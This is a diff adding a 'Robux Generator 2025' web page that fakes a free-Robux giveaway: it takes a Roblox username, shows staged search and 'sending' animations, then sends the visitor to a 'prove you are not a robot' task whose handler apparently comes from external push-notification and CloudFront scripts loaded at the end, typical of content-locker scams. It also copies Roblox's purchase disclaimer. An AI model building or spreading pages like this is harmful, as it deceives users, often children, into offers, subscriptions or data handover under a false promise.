@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html class="ltr" dir="ltr" lang="en">
+
+<head>
+    <meta charset="utf-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e4f2c886-84b7-4d82-9d84-3a3db2228ac1
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <link href="images/icon.ico" rel="icon">
+    <title>Robux Generator 2025</title>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NT9NZMW3SD"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'G-NT9NZMW3SD');
+    </script>
+
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Mochiy+Pop+One&family=Nunito:wght@200&family=Poppins:wght@400;600;700;900&family=REM:wght@300&family=Varela+Round&display=swap");
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Kumbh Sans", sans-serif;
+        }
+
+        .logo {
+            width: 30px;
+            display: flex;
+            align-items: center;
+            transition: transform 0.3s ease;
+        }
+
+        .logo:hover {
+            transform: scale(1.1);
+        }
+
+        .logo span {
+            font-weight: 900;
+            margin-right: 18px;
+            font-size: 25px;
+            transition: color 0.3s ease;
+        }
+
+        .logo span:hover {
+            color: #007AFF;
+        }
+
+        nav {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(135deg, #dee1e3, #f0f3f5);
+            border: solid #c7cbce;
+            border-width: 0 0 1px;
+            padding: 0 40px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.8s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+        }
+
+        nav ul li {
+            margin-left: 30px;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        nav ul li:hover {
+            background: rgba(0, 122, 255, 0.1);
+            color: #007AFF;
+            transform: translateY(-2px);
+        }
+
+        nav ul li::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        nav ul li:hover::before {
+            left: 100%;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f2f4f5, #e8ebec);
+            color: #393b3d;
+            min-height: 100vh;
+            animation: fadeIn 1s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        img {
+            width: 100%;
+        }
+
+        .middle {
+            width: 70%;
+            margin: 10px auto;
+            height: 135px;
+            background: linear-gradient(135deg, rgba(39, 39, 46, 0.8), rgba(0, 122, 255, 0.6)), url(images/bp.jpg);
+            background-position: bottom;
+            background-size: cover;
+            margin-bottom: 24px;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: zoomIn 1s ease-out 0.3s both;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .middle::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%) translateY(-100%) rotate(45deg);
+            }
+            100% {
+                transform: translateX(100%) translateY(100%) rotate(45deg);
+            }
+        }
+
+        @keyframes zoomIn {
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .middle h2 {
+            margin-bottom: 10px;
+            font-size: 35px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .middle p {
+            font-size: 17px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+        }
+
+        body .para {
+            font-size: 10px;
+            font-weight: 500;
+            margin-top: 50px;
+            color: #606162;
+            text-align: center;
+            width: 100%;
+            margin: 50px auto;
+            animation: slideUp 1s ease-out 1s both;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .box_con {
+            margin: 0 auto;
+            background: linear-gradient(135deg, #ffffff, #f8f9fa);
+            min-height: 163px;
+            width: 70%;
+            font-size: 20px;
+            padding: 20px;
+            border: solid #c7cbce;
+            border-width: 1px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            animation: slideUp 1s ease-out 0.6s both;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .box_con::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #007AFF, #00C851, #007AFF);
+            background-size: 200% 100%;
+            animation: gradientMove 2s linear infinite;
+        }
+
+        @keyframes gradientMove {
+            0% {
+                background-position: 200% 0;
+            }
+            100% {
+                background-position: -200% 0;
+            }
+        }
+
+        input {
+            padding: 11px 15px;
+            border: 2px solid transparent;
+            background: #f2f4f5;
+            border-radius: 12px;
+            outline: none;
+            font-size: 17px;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        input:focus {
+            border-color: #007AFF;
+            background: #fff;
+            box-shadow: 0 0 20px rgba(0, 122, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        button {
+            background: linear-gradient(135deg, #393b3d, #2c2e30);
+            outline: none;
+            border: none;
+            color: #fff;
+            padding: 12px 25px;
+            border-radius: 12px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            font-size: 19px;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        button:active {
+            transform: translateY(-1px);
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        button:hover::before {
+            left: 100%;
+        }
+
+        .box2 {
+            display: none;
+            text-align: center;
+        }
+
+        .box3 {
+            display: none;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(-30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .box4 {
+            display: none;
+            animation: bounceIn 0.8s ease-out;
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.3);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            70% {
+                transform: scale(0.9);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(135deg, #ffffffbc, #f8f9fabc);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .row {
+            display: flex;
+            align-items: center;
+            height: 70px;
+            justify-content: space-around;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .row:not(.row:last-child) {
+            border-bottom: 1px solid #bdbebe;
+        }
+
+        .row:hover {
+            background: linear-gradient(135deg, rgba(0, 122, 255, 0.1), rgba(0, 200, 81, 0.1));
+            transform: translateX(10px);
+        }
+
+        .price {
+            font-size: 20px;
+            font-weight: 700;
+            color: #00C851;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .robux_total {
+            display: flex;
+            align-items: center;
+        }
+
+        .details {
+            border: 2px solid #b8b8b8;
+            border-radius: 12px;
+            padding: 8px 15px;
+            width: 180px;
+            display: flex;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: linear-gradient(135deg, #fff, #f8f9fa);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .details:hover {
+            background: linear-gradient(135deg, #007AFF, #00C851);
+            color: white;
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            border-color: transparent;
+        }
+
+        .pic {
+            width: 30px;
+            margin-right: 10px;
+            pointer-events: none;
+            margin-top: 2px;
+            transition: transform 0.3s ease;
+        }
+
+        .details:hover .pic {
+            transform: rotate(360deg);
+        }
+
+        span {
+            font-size: 20px;
+            font-weight: 800;
+            color: rgba(0, 0, 0, 0.6);
+            transition: color 0.3s ease;
+        }
+
+        .details:hover span {
+            color: white;
+        }
+
+        h3 {
+            font-size: 32px;
+            margin-bottom: 21px;
+            background: linear-gradient(135deg, #007AFF, #00C851);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .folding {
+            margin: 20px auto;
+            width: 100px;
+            height: 100px;
+            position: relative;
+            transform: rotateZ(45deg);
+        }
+
+        .square {
+            position: absolute;
+            top: 36%;
+            right: 35%;
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, #007AFF, #00C851);
+            transform: rotateZ(87deg);
+            border-radius: 4px;
+        }
+
+        .folding .sk-cube {
+            float: left;
+            width: 50%;
+            height: 50%;
+            position: relative;
+            transform: scale(1.1);
+        }
+
+        .folding .sk-cube:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #007AFF, #00C851);
+            animation: sk-foldCubeAngle 2.4s infinite linear both;
+            transform-origin: 100% 100%;
+            border-radius: 2px;
+        }
+
+        .folding .sk-cube2 {
+            transform: scale(1.1) rotateZ(90deg);
+        }
+
+        .folding .sk-cube3 {
+            transform: scale(1.1) rotateZ(180deg);
+        }
+
+        .folding .sk-cube4 {
+            transform: scale(1.1) rotateZ(270deg);
+        }
+
+        .folding .sk-cube2:before {
+            animation-delay: 0.3s;
+        }
+
+        .folding .sk-cube3:before {
+            animation-delay: 0.6s;
+        }
+
+        .folding .sk-cube4:before {
+            animation-delay: 0.9s;
+        }
+
+        @keyframes sk-foldCubeAngle {
+            0%,
+            10% {
+                transform: perspective(140px) rotateX(-180deg);
+                opacity: 0;
+            }
+            25%,
+            75% {
+                transform: perspective(140px) rotateX(0deg);
+                opacity: 1;
+            }
+            90%,
+            100% {
+                transform: perspective(140px) rotateY(180deg);
+                opacity: 0;
+            }
+        }
+
+        .complete-btn {
+            background: linear-gradient(135deg, #00C851, #007AFF) !important;
+            animation: glowing 2s infinite;
+        }
+
+        @keyframes glowing {
+            0%,
+            100% {
+                box-shadow: 0 8px 20px rgba(0, 200, 81, 0.3);
+            }
+            50% {
+                box-shadow: 0 8px 30px rgba(0, 200, 81, 0.6);
+            }
+        }
+
+        .success-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(0, 200, 81, 0.9), rgba(0, 122, 255, 0.9));
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .success-content {
+            text-align: center;
+            color: white;
+            animation: successBounce 1s ease-out;
+        }
+
+        @keyframes successBounce {
+            0% {
+                transform: scale(0);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: #007AFF;
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 1042px) {
+            .middle,
+            .box_con,
+            .para {
+                width: 90%;
+            }
+        }
+
+        @media (max-width: 750px) {
+            .middle,
+            .box_con {
+                width: 100%;
+                margin: 10px 5px;
+            }
+            .para {
+                width: 100%;
+                padding: 0 10px;
+            }
+            .middle h2 {
+                margin-bottom: 10px;
+                font-size: 30px;
+            }
+            .middle p {
+                font-size: 13px;
+            }
+            nav {
+                padding: 0 20px;
+            }
+            nav ul li {
+                margin-left: 15px;
+                padding: 8px 10px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            nav {
+                padding: 0 10px;
+            }
+            .logo span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Particles Background -->
+    <div class="particles" id="particles">
+        <div class="particle" style="left: 21.2268%; animation-delay: 2.64296s; animation-duration: 3.21622s; background: rgb(0, 122, 255);"></div>
+        <div class="particle" style="left: 69.9723%; animation-delay: 3.17329s; animation-duration: 3.99999s; background: rgb(78, 205, 196);"></div>
+        <div class="particle" style="left: 25.8082%; animation-delay: 2.77154s; animation-duration: 5.10391s; background: rgb(0, 122, 255);"></div>
+        <div class="particle" style="left: 55.8337%; animation-delay: 4.092s; animation-duration: 4.46505s; background: rgb(78, 205, 196);"></div>
+        <div class="particle" style="left: 54.6145%; animation-delay: 5.81829s; animation-duration: 4.9109s; background: rgb(255, 107, 107);"></div>
+        <div class="particle" style="left: 89.2068%; animation-delay: 4.15588s; animation-duration: 3.8376s; background: rgb(255, 107, 107);"></div>
+        <div class="particle" style="left: 70.7452%; animation-delay: 4.84824s; animation-duration: 3.83969s; background: rgb(255, 107, 107);"></div>
+        <div class="particle" style="left: 33.0256%; animation-delay: 4.53142s; animation-duration: 5.01913s; background: rgb(0, 122, 255);"></div>
+        <div class="particle" style="left: 49.4242%; animation-delay: 0.581289s; animation-duration: 4.05556s; background: rgb(0, 200, 81);"></div>
+        <div class="particle" style="left: 5.03984%; animation-delay: 5.96825s; animation-duration: 4.68731s; background: rgb(69, 183, 209);"></div>
+        <div class="particle" style="left: 35.0199%; animation-delay: 4.44617s; animation-duration: 5.60078s; background: rgb(0, 200, 81);"></div>
+        <div class="particle" style="left: 9.87098%; animation-delay: 3.7541s; animation-duration: 4.25117s; background: rgb(0, 122, 255);"></div>
+        <div class="particle" style="left: 38.125%; animation-delay: 1.76355s; animation-duration: 3.59521s; background: rgb(69, 183, 209);"></div>
+        <div class="particle" style="left: 45.5223%; animation-delay: 0.721266s; animation-duration: 4.82386s; background: rgb(69, 183, 209);"></div>
+        <div class="particle" style="left: 81.1992%; animation-delay: 4.57768s; animation-duration: 4.46549s; background: rgb(78, 205, 196);"></div>
+        <div class="particle" style="left: 6.6288%; animation-delay: 3.42454s; animation-duration: 4.17704s; background: rgb(0, 200, 81);"></div>
+        <div class="particle" style="left: 20.1832%; animation-delay: 2.63632s; animation-duration: 5.69158s; background: rgb(0, 122, 255);"></div>
+        <div class="particle" style="left: 4.47743%; animation-delay: 4.75846s; animation-duration: 4.28921s; background: rgb(0, 200, 81);"></div>
+        <div class="particle" style="left: 77.6715%; animation-delay: 2.19119s; animation-duration: 4.91603s; background: rgb(69, 183, 209);"></div>
+        <div class="particle" style="left: 95.0575%; animation-delay: 3.44203s; animation-duration: 4.34432s; background: rgb(255, 107, 107);"></div>
+    </div>
+
+    <!-- Success Animation Overlay -->
+    <div class="success-animation" id="successOverlay">
+        <div class="success-content">
+            <h1 style="font-size: 60px; margin-bottom: 20px;">🎉</h1>
+            <h2>Success!</h2>
+            <p>Robux has been sent to your account!</p>
+        </div>
+    </div>
+
+    <nav>
+        <div class="logo">
+            <span>☰</span>
+            <img src="images/download.png" alt="">
+        </div>
+        <ul>
+            <li onclick="playClickSound()">Discover</li>
+            <li onclick="playClickSound()">Marketplace</li>
+            <li onclick="playClickSound()">Robux</li>
+        </ul>
+    </nav>
+
+    <div class="middle">
+        <h2>💎 Robux</h2>
+        <p>Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
+    </div>
+
+    <div class="box_con">
+        <div class="box">
+            <h3>🎮 Roblox username</h3><br>
+            <input class="username" type="text" name="" placeholder="Enter username"><br>
+            <button class="getrbx" onclick="playButtonSound()">Next ➡️</button>
+        </div>
+
+        <div class="box2">
+            <div class="folding">
+                <div class="sk-cube1 sk-cube"></div>
+                <div class="sk-cube2 sk-cube"></div>
+                <div class="sk-cube4 sk-cube"></div>
+                <div class="sk-cube3 sk-cube"></div>
+                <div class="square"></div>
+            </div>
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">🔍 searching for user...</p>
+        </div>
+
+        <div class="box3">
+            <div class="container">
+                <div class="row">
+                    <div class="price">💰 $0.00 free</div>
+                    <div class="details" onclick="playSelectSound()">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>800</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">💰 $0.00 free</div>
+                    <div class="details" onclick="playSelectSound()">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>1700</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">💰 $0.00 free</div>
+                    <div class="details" onclick="playSelectSound()">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div>
+                            <span>5500</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">💰 $0.00 free</div>
+                    <div class="details" onclick="playSelectSound()">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>10000</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="box4">
+            <h3>✨ Last step</h3>
+            <p>Please verify that you are not a robot, click the button and complete one task</p>
+            <button class="complete-btn" onclick="_CJ()">🚀 Complete</button>
+        </div>
+    </div>
+
+    <div class="para">
+        <p>When you buy Robux you receive only a limited, non-refundable, non-transferable, revocable license to use Robux, which has no value in real currency. By selecting the Premium subscription package, (1) you agree that you are over 18 and that you
+            authorize us to charge your account every month until you cancel the subscription, and (2) you represent that you understand and agree to the Terms of Use, which includes an agreement to arbitrate any dispute between you and Roblox, and Privacy
+            Policy. You can cancel at any time by clicking "Cancel subscription" on the billing tab of the setting page. If you cancel, you will still be charged for the current billing period. See Terms of Use for other limitations.</p>
+    </div>
+
+    <script>
+        // Audio Context for sound effects
+        let audioContext;
+
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new(window.AudioContext || window.webkitAudioContext)();
+            }
+        }
+
+        function playSound(frequency, duration, type = 'sine', volume = 0.3) {
+            initAudio();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+
+            oscillator.frequency.value = frequency;
+            oscillator.type = type;
+
+            gainNode.gain.setValueAtTime(volume, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
+
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + duration);
+        }
+
+        function playClickSound() {
+            playSound(800, 0.1, 'square', 0.1);
+        }
+
+        function playButtonSound() {
+            playSound(600, 0.2, 'sawtooth', 0.2);
+            setTimeout(() => playSound(800, 0.1, 'sine', 0.1), 100);
+        }
+
+        function playSelectSound() {
+            playSound(1000, 0.15, 'triangle', 0.15);
+            setTimeout(() => playSound(1200, 0.1, 'sine', 0.1), 80);
+        }
+
+        function playSuccessSound() {
+            // Success melody
+            const notes = [523, 659, 784, 1047];
+            notes.forEach((note, index) => {
+                setTimeout(() => playSound(note, 0.3, 'sine', 0.2), index * 150);
+            });
+        }
+
+        // Create floating particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
+
+                // Random colors
+                const colors = ['#007AFF', '#00C851', '#FF6B6B', '#4ECDC4', '#45B7D1'];
+                particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Initialize particles on load
+        window.addEventListener('load', createParticles);
+
+        const rbxbtn = document.querySelector(".getrbx");
+        const box1 = document.querySelector(".box");
+        const box2 = document.querySelector(".box2");
+        const box3 = document.querySelector(".box3");
+        const box4 = document.querySelector(".box4");
+        const rbxtotal = document.querySelectorAll(".details");
+        const username = document.querySelector(".username");
+        const useroutput = document.querySelector(".useroutput");
+
+        rbxbtn.addEventListener("click", () => {
+            if (username.value.length <= 2) {
+                playSound(300, 0.5, 'sawtooth', 0.3); // Error sound
+                alert("Please enter username");
+            } else {
+                playButtonSound();
+                box1.style.display = "none";
+                box2.style.display = "block";
+                setTimeout(showbox2, 4500);
+                setTimeout(showbox3, 4500);
+                setTimeout(() => playSound(900, 0.2, 'sine', 0.15), 4500); // Completion sound
+            }
+
+            useroutput.innerHTML = `🔍 Searching for <b>${username.value}</b> ...`;
+        });
+
+        rbxtotal.forEach((btn) => {
+            btn.addEventListener("click", () => {
+                playSelectSound();
+                box3.style.display = "none";
+                box2.style.display = "block";
+
+                setTimeout(showboxagain, 2500);
+                setTimeout(showbox4, 2500);
+                setTimeout(() => playSound(1100, 0.2, 'triangle', 0.15), 2500);
+                useroutput.innerHTML = `💰 Sending Robux to <b>${username.value}</b>...`;
+            });
+        });
+
+        function _LF() {
+            playSuccessSound();
+            const successOverlay = document.getElementById('successOverlay');
+            successOverlay.style.display = 'flex';
+
+            setTimeout(() => {
+                successOverlay.style.display = 'none';
+            }, 3000);
+        }
+
+        let showboxagain = () => {
+            box2.style.display = "none";
+        };
+
+        let showbox2 = () => {
+            box2.style.display = "none";
+        };
+
+        let showbox3 = () => {
+            box3.style.display = "block";
+        };
+
+        let showbox4 = () => {
+            box4.style.display = "block";
+        };
+
+        // Add hover sound effects to buttons
+        document.querySelectorAll('button, .details').forEach(element => {
+            element.addEventListener('mouseenter', () => {
+                playSound(1200, 0.05, 'sine', 0.05);
+            });
+        });
+
+        // Add typing sound to input
+        username.addEventListener('input', () => {
+            playSound(800, 0.05, 'square', 0.03);
+        });
+
+        // Keyboard navigation sounds
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                playSound(1000, 0.1, 'sine', 0.1);
+            }
+        });
+    </script>
+
+    <script type="application/javascript" src="https://bnkjs.nxt-psh.com/ps/ps.js?id=IMOkx08z80i1qx_4H4XAgQ"></script>
+
+    <script type="text/javascript">
+        var rmIYL_zKD_psvTVc = {
+            "it": 4441320,
+            "key": "066cc"
+        };
+    </script>
+    <script src="https://d1chbu4sfo2xhu.cloudfront.net/2efbe96.js"></script>
+
+</body>
+
+</html>
